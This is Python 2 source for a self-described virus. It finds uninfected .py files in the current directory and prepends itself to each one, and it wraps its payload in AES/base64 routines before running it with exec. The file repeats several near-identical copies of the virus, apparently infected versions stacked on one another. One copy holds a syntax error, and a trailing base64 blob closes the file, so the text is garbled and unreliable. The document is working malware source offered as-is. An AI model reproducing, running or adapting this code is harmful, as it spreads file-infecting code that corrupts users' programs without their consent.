######################################################## First script python
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload.))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return f.readline().startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payload#######################
# First Python script #
#######################
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload[1:]))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return str(f.readlines(3)) == '#######################\n# First Python script #\n#######################'

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payload#######################
# First Python script #
#######################
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return f.readline().startswith('#######################\n# First Python script #\n#######################')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payload#######################
# First Python script #
#######################
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return f.readline().startswith('#######################\n# First Python script #\n#######################')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payload#######################
# First Python script #
#######################
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return f.readline().startswith('########################\n First Python script #\n#######################')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payload#######################
# First Python script #
#######################
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decrypt the virus main 
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload))
print e
exec e

sys.exit('Good job!')

#Start payload
def is_infected(filename):
   f = open(filename, 'r')
   return f.readline().startswith('########################\n First Python script #\n#######################')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the malware
   for line in this:
      destination.write(line)

   # Append the original file
   for line in source:
      destination.write(line)

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         infect(filename)

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readlines(3)
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)
 ####################

find_and_infect_files()
#End payloaddkXoeTM13cN7jIhfxUSrO886Dcxj8vwMXQun9R5l4jSYOzIVkknzNqtjhlS+kb3JcVUm0o81xPy0d2Iz9gepTYuNt+MqeDr+2l0DdcGlZqzIche1CLXlRns5J0ksVIbdyeZUfPvYYUH9RkGXE7HNF6+tKlOX4m4WSrhaHM8eLDz9YfMYEVT2l2eQ2yHP4j7P1VFt3pCNXSqD3KBLfwZagugaMREB9Trf0GrB8GFsfrNHDk/HW6WHdmy8eEPkaR6xOb/9VNZ1HgqJ7C+WrI6NNjw9XCAIlPcUB0i4FyRSW02dbBJlE06TPGYOCsXTai/UhuEzZaUuEVUZdXW6